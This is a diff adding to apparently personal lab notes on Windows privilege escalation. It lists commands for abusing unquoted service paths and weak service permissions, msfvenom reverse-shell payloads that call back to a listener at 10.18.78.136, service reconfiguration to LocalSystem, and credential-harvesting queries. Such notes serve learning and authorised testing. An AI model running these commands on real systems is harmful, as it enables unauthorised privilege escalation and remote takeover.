@@ -238,3 +238,54 @@ runas /savecred /user:admin cmd.exe
 
 -> Stored proxy credentials
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+
+
+
+
+
+
+
+
+
+
+
+
+
+-> Unquoted Service Paths
+
+sc qc "disk sorter enterprise"
+-> Searching for services with spaces might mean we can create a missing exe (disk.exe) as it will look for that first. 
+icacls <binary path>
+-> Check the instalation folder for permissions
+msfvenom -p windows/x64/shell_reverse_tcp lhost=10.18.78.136 lport=1337 -f exe-service -o rev-svc2.exe
+-> Create payload, transfer, setup listener
+sc stop/start "disk sorter enterprise"
+-> Stop then start the service
+
+-> Insecure Service Permissions
+
+accesschk64.exe -qlc thmservice
+-> Use Sysinternals accesschk to check the service DACL config permissions
+-> SERVICE_ALL_ACCESS for BUILTIN\Users mean we can change the configuration of the service
+sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+-> Change the service binary
+msfvenom -p windows/x64/shell_reverse_tcp lhost=10.18.78.136 lport=1337 -f exe-service -o rev-svc2.exe
+-> Create payload, transfer, setup listener
+sc start/stop "thmservice"
+-> Stop then start the service
+
+: Vulnerable Software
+
+wmic product get name,version,vendor
+-> Displays most installed programs. Check for vulnerabilities.
+
+: Other tools to use
+
+WinPEAS
+
+PrivescCheck
+
+WES-NG: Windows Exploit Suggester - Next Generation
+
+Metasploit
+
